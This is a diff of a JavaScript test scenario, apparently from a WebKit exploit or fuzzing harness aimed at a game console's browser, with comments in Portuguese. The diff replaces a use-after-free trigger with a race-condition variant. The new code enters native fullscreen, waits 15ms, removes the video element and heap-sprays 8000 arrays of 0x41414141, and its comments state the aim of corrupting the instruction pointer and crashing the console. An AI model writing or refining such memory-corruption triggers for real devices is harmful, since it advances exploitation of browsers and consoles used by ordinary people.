@@ -1,15 +1,15 @@
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_SRC_UAF
- * Alvo: FullscreenVideoController + MediaPlayerPrivate
+ * CENÁRIO: VIDEO_FULLSCREEN_ENTRANCE_CRASH
+ * Alvo: Race Condition durante a alocação de memória do Manx na ENTRADA do Fullscreen
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_SRC_UAF',
+    id:       'VIDEO_FULLSCREEN_ENTRANCE_CRASH',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Evita o GPU Hang (Soft Brick) mantendo o DOM intacto, mas destrói ' +
-                 'o MediaPlayerPrivate C++ removendo o src e forçando um load() ' +
-                 'durante o Fullscreen, seguido do Spray de 0x41414141.',
+    description: 'Foco exclusivo no CRASH: Corre contra a entrada do Fullscreen. ' +
+                 'Remove o vídeo exatamente durante a transição de entrada nativa do Manx ' +
+                 'e faz o spray massivo para corromper o RIP.',
 
     setup: async function() {
         this.container = document.createElement('div');
@@ -20,7 +20,7 @@ export default {
         this.video.controls = true;
         this.container.appendChild(this.video);
 
-        // O nosso payload malicioso (Ponteiros 0x41414141 = "AAAA")
+        // A munição: 0x41414141 (AAAA) - O gatilho perfeito para o Crash
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -35,49 +35,46 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entramos em Fullscreen nativo (Manx)
+            // 1. INICIA A ENTRADA NO FULLSCREEN NATIVO
             if (this.video.webkitEnterFullscreen) {
                 this.video.webkitEnterFullscreen();
             } else if (this.video.webkitRequestFullscreen) {
                 this.video.webkitRequestFullscreen();
             }
-            
-            // Aguardamos a transição gráfica estabilizar
-            await new Promise(r => setTimeout(r, 400)); 
 
-            // 2. A MÁGICA: Em vez de remover o elemento do DOM, arrancamos o "motor" do vídeo!
-            // Isso força o WebKit a deletar o MediaPlayerPrivate antigo.
-            this.video.removeAttribute('src');
-            this.video.load(); 
+            // 2. A JANELA CRÍTICA (RACE CONDITION)
+            // Em vez de esperar 400ms, esperamos apenas 15ms! 
+            // Queremos apanhar o C++ a MEIO da alocação do ecrã inteiro.
+            await new Promise(r => setTimeout(r, 15)); 
 
-            // 3. SPRAY: Preenchemos o buraco do player antigo com os nossos ponteiros
+            // 3. FREE: Puxamos o tapete enquanto o C++ ainda está a trabalhar!
+            this.video.remove();
+
+            // 4. SPRAY AGRESSIVO: Enchemos o buraco imediatamente.
+            // Quando a função de entrada do Fullscreen tentar ler a memória para 
+            // concluir o trabalho, vai ler 0x41414141 e Crashar.
             this.spray = [];
-            for (let i = 0; i < 5000; i++) {
+            for (let i = 0; i < 8000; i++) { // Spray aumentado para 8000
                 let arr = new Uint32Array(256);
                 arr.set(this.sprayPayload);
                 this.spray.push(arr);
             }
 
-            // 4. USE: Dizemos ao controlador para sair. 
-            // O controlador ainda aponta para o MediaPlayerPrivate que acabámos de destruir no passo 2!
-            if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            } else if (this.video.webkitExitFullscreen) {
-                this.video.webkitExitFullscreen();
-            }
+            // ATENÇÃO: Retiramos propositadamente o webkitExitFullscreen. 
+            // Queremos que a consola bata de frente com a corrupção.
 
         } catch(e) {}
     },
 
     probe: [
-        s => s.video.readyState,
-        s => s.video.webkitDecodedFrameCount,
-        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
+        // Mantemos probes mínimas. Se o crash não ocorrer instantaneamente, 
+        // isto tenta aceder ao lixo que deixámos para forçar o erro.
+        s => s.video.videoWidth,
+        s => s.video.webkitDecodedFrameCount
     ],
 
     cleanup: function() {
         try { this.container.remove(); } catch(e) {}
         this.spray = null;
-        this.video = null;
     }
 };
